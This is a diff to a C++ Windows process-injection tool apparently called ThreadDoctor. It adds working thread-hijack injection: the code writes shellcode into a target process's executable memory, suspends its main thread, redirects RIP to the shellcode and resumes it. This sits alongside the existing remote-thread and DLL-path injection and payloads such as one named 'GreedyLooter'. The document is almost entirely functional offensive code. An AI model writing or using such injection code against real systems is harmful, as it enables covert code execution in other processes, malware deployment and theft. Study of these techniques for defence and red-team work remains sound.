@@ -16,7 +16,7 @@
 // - Various APC
 // - memory map
 
-enum class InjType { None, RemoteThread, DLLPath};
+enum class InjType { None, RemoteThread, DLLPath, ThreadHijack};
 enum class Payload { None, Calculator, Commandline, GreedyLooter};
 
 // get Process ID by process name
@@ -75,6 +75,7 @@ NTSTATUS setRtlSEDebug() {
 	return status;
 }
 
+
 // inject shellcode into remote process then start remote thread calling shellcode
 BOOL createRemoteThreadInject(DWORD processId, HGLOBAL shellcode, const size_t shellcodeSize) {
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
@@ -83,8 +84,58 @@ BOOL createRemoteThreadInject(DWORD processId, HGLOBAL shellcode, const size_t s
 	LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	// Write shellcode to remote buffer
 	BOOL cWrite = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)shellcode, shellcodeSize, NULL);
+
 	// create a thread in the remote process that starts execution on shellcode
 	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
+
+	return true;
+}
+
+HANDLE getThread(DWORD pid) {
+	THREADENTRY32 threadEntry;
+	threadEntry.dwSize = sizeof(THREADENTRY32);
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+	Thread32First(snapshot, &threadEntry);
+	while (Thread32Next(snapshot, &threadEntry)) {
+		if (threadEntry.th32OwnerProcessID == pid) {
+			return OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+		}
+	}
+	return NULL;
+}
+
+// (x64) Hijack remote processes main thread, Suspend-Inject-Resume (SIR)
+BOOL threadHijackInject(DWORD processId, HGLOBAL shellcode, const size_t shellcodeSize) {
+	HANDLE hProcess, mainThread;
+	LPVOID rBuffer;
+	BOOL bStatus;
+	DWORD status;
+	CONTEXT context;
+	context.ContextFlags = CONTEXT_FULL;
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+
+	// Allocate Buffer for shellcode in remote process
+	rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	// Write shellcode to remote buffer
+	bStatus = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)shellcode, shellcodeSize, NULL);
+
+	// get main thread of target process
+	mainThread = getThread(processId);
+
+	// suspend target process
+	status = SuspendThread(mainThread);
+
+	// get thread context
+	bStatus = GetThreadContext(mainThread, &context);
+	// set new RIP address
+	context.Rip = (DWORD_PTR)rBuffer;
+	// set new thread context
+	bStatus = SetThreadContext(mainThread, &context);
+
+	// resume suspended thread
+	status = ResumeThread(mainThread);
 
 	return true;
 }
@@ -123,7 +174,7 @@ std::tuple<HGLOBAL,DWORD> getPayload(Payload payload) {
 // prints commandline usage
 int printUsage() {
 	wprintf(L"Usage: ThreadDoctor.exe <-t Injection-Type> <-p Payload> [-f DLLPath] {-n ProcessName|-d ProcessID}\n");
-	wprintf(L"  -t <type>          Injection type (1: RemoteThread, 2: DLLPath)\n");
+	wprintf(L"  -t <type>          Injection type (1: RemoteThread, 2: DLLPath, 3: ThreadHijack)\n");
 	wprintf(L"  -p <payload>       x64 payload to use (1: Calculator, 2: Commandline, 2: GreedyLooter)\n");
 	wprintf(L"  -n <PID>           PID of target process\n");
 	wprintf(L"  -d <proc-name>     target process name\n");
@@ -205,6 +256,12 @@ int wmain(int argc, wchar_t *argv[])
 		}
 
 		dllPathInject(processId, dllPath);
+		break;
+	}
+	case InjType::ThreadHijack:
+	{
+		std::tuple<HGLOBAL,DWORD> shellcode = getPayload(payload);
+		threadHijackInject(processId, std::get<0>(shellcode), std::get<1>(shellcode));
 		break;
 	}
 	default:
